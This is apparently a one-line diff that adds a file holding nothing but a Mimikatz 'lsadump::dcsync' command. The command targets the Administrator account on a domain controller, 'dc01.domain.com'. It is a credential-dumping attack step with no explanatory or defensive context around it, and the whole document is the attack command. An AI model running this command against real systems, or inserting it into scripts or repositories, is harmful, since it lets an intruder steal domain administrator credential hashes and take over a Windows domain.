@@ -1,0 +1,1 @@
+mimikatz "lsadump::dcsync /domain:dc01.domain.com /user:Administrator"
